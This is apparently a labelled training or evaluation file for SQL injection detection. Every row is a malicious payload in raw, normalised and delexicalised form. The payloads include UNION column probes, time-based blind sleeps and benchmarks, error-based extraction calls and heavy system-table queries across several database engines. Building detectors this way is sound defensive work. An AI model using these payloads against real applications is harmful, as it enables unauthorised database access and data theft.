payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--","<NUM> ) ) ) union all select null,null,null,null,null,null,null,null,null,null--"
"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sqli_dataset.csv,,True,"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM>' ) as kbja where <NUM> = <NUM> and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --"
1'+  (  select 'hjku' where 1954  =  1954 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',1,sqli_dataset.csv,,True,1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',<NUM><STR>hjku<STR>
"1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  1624  =  1624",1,sqli_dataset.csv,,True,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 1624 = 1624","<NUM> ) procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x52515a50 ) ) ) ) ) ,<NUM> ) and ( <NUM> = <NUM>"
"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""smhd"" like ""smhd",1,sqli_dataset.csv,,True,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""smhd",<NUM><STR>smhd<STR>smhd
"-1174"" union all select 4303,4303,4303,4303#",1,sqli_dataset.csv,,False,"-1174"" union all select 4303,4303,4303,4303#","-<NUM>"" union all select <NUM>,<NUM>,<NUM>,<NUM>#"
"1   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sqli_dataset.csv,,False,"1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM> ) ) or <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxhn' like 'zxhn",1,sqli_dataset.csv,,True,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",<NUM><STR>zxhn<STR>zxhn
"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",1,sqli_dataset.csv,,False,"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )","<NUM>, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) )"
-1217'   )    )     )   order by 1#,1,sqli_dataset.csv,,False,-1217' ) ) ) order by 1#,-<NUM>' ) ) ) order by <NUM>#
"iif  (  2205  =  4764,1,1/0  )  ",1,sqli_dataset.csv,,False,"iif ( 2205 = 4764,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )"
"1"" union all select null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" union all select null,null,null,null,null,null,null,null,null#","<NUM>"" union all select null,null,null,null,null,null,null,null,null#"
"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--",1,sqli_dataset.csv,,False,"select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 0 end ) limit 1--","select * from generate_series ( <NUM>,<NUM>,case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) limit <NUM>--"
"-5148""   )    )    or 5310  =  8229",1,sqli_dataset.csv,,False,"-5148"" ) ) or 5310 = 8229","-<NUM>"" ) ) or <NUM> = <NUM>"
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  9505  =  9505,1,sqli_dataset.csv,,False,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,<NUM> ) and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) and ( <NUM> = <NUM>
1   )    )     )   and 9198  =  9198--,1,sqli_dataset.csv,,False,1 ) ) ) and 9198 = 9198--,<NUM> ) ) ) and <NUM> = <NUM>--
1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sqli_dataset.csv,,False,1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,<NUM>%' ) ) ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --
1'+  (  select 'zugq' where 9218  =  9218,1,sqli_dataset.csv,,True,1'+ ( select 'zugq' where 9218 = 9218,<NUM><STR>zugq' where <NUM> = <NUM>
"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",1,sqli_dataset.csv,,True,"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",<NUM>%<STR>%<STR>
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1,sqli_dataset.csv,,False,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-1889%'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1,sqli_dataset.csv,,False,"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",-<NUM>%<STR>%<STR>
"1' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",1,sqli_dataset.csv,,False,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",<NUM><STR>yhkr<STR>yhkr
"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",1,sqli_dataset.csv,,False,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1"" where 7158  =  7158",1,sqli_dataset.csv,,False,"1"" where 7158 = 7158","<NUM>"" where <NUM> = <NUM>"
"1""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>"" ) ) ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
1 where 3735  =  3735,1,sqli_dataset.csv,,False,1 where 3735 = 3735,<NUM> where <NUM> = <NUM>
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz",1,sqli_dataset.csv,,True,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # lgoz","<NUM> or ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) # lgoz"
"1%""   )    )    and 9198  =  9198--",1,sqli_dataset.csv,,False,"1%"" ) ) and 9198 = 9198--","<NUM>%"" ) ) and <NUM> = <NUM>--"
"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,sqli_dataset.csv,,False,"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )","<NUM>, ( cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) )"
"1'||  (  select 'uvbb' where 7795  =  7795 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,sqli_dataset.csv,,False,"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",<NUM><STR>uvbb<STR>
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'ksoc'  =  'ksoc,1,sqli_dataset.csv,,False,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( ( ( <STR> = 'ksoc
select   (  case when   (  1005  =  5996  )   then 1 else 1005*  (  select 1005 from master..sysdatabases  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master..sysdatabases ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from master..sysdatabases ) end ) --
"-9272%""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,1,sqli_dataset.csv,,False,"-9272%"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,-<NUM>%<STR>%<STR>
1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--,1,sqli_dataset.csv,,True,1'+ ( select rdwb where 2498 = 2498 and 3429 = 7639--,<NUM>'+ ( select rdwb where <NUM> = <NUM> and <NUM> = <NUM>--
-9191'  )   as qtvm where 2838  =  2838 or   (  8459  =  8459  )  *4906--,1,sqli_dataset.csv,,False,-9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--,-<NUM>' ) as qtvm where <NUM> = <NUM> or ( <NUM> = <NUM> ) *<NUM>--
select   (  case when   (  4935  =  4734  )   then 4935 else 4935*  (  select 4935 from mysql.db  )   end  )  #,1,sqli_dataset.csv,,False,select ( case when ( 4935 = 4734 ) then 4935 else 4935* ( select 4935 from mysql.db ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) #
"-9840   )    )    as thod where 4790  =  4790 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sqli_dataset.csv,,True,"-9840 ) ) as thod where 4790 = 4790 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --","-<NUM> ) ) as thod where <NUM> = <NUM> or <NUM> = convert ( int, ( select char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) --"
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( ( <STR> = '"
"1   )    )    as hgtl where 3864  =  3864 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sqli_dataset.csv,,False,"1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3114,sleep ( 5 ) ) #","<NUM> ) ) as hgtl where <NUM> = <NUM> and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #"
"1%""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",1,sqli_dataset.csv,,True,"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",<NUM><STR>fbol<STR>fbol
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # eahg",1,sqli_dataset.csv,,True,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg","<NUM> or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg"
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",1,sqli_dataset.csv,,False,"-6294"" union all select 9921,9921,9921,9921,9921,9921--","-<NUM>"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",1,sqli_dataset.csv,,True,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'zpkv' = 'zpkv",<NUM><STR>zpkv<STR>zpkv
"1  )   where 6954  =  6954 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sqli_dataset.csv,,True,"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --","<NUM> ) where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x76555642 ) ) --"
"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",1,sqli_dataset.csv,,False,"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",<NUM><STR>osty<STR>
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'hqcz'  =  'hqcz,1,sqli_dataset.csv,,False,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,<NUM><STR>hqcz<STR>hqcz
"1""  )   as ivkw where 4218  =  4218 union all select null--",1,sqli_dataset.csv,,False,"1"" ) as ivkw where 4218 = 4218 union all select null--","<NUM>"" ) as ivkw where <NUM> = <NUM> union all select null--"
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,1,sqli_dataset.csv,,False,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,<NUM><STR>gjja<STR>gjja
"1""  )   where 2088  =  2088 union all select null,null,null,null--",1,sqli_dataset.csv,,False,"1"" ) where 2088 = 2088 union all select null,null,null,null--","<NUM>"" ) where <NUM> = <NUM> union all select null,null,null,null--"
"-2230%"" union all select 3303,3303,3303--",1,sqli_dataset.csv,,False,"-2230%"" union all select 3303,3303,3303--","-<NUM>%"" union all select <NUM>,<NUM>,<NUM>--"
"1""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sqli_dataset.csv,,False,"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>"" ) and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"-4418"" or 6872  =  6872 and ""gbut""  =  ""gbut",1,sqli_dataset.csv,,False,"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",-<NUM><STR>gbut<STR>gbut
select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,1,sqli_dataset.csv,,False,select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,select sleep ( <NUM> ) and ( ( <STR> = 'wyvx
"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",1,sqli_dataset.csv,,False,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#","<NUM>"" ) ) as xhat where <NUM> = <NUM> union all select null,null,null#"
1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1,sqli_dataset.csv,,False,1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',<NUM><STR>brde<STR>
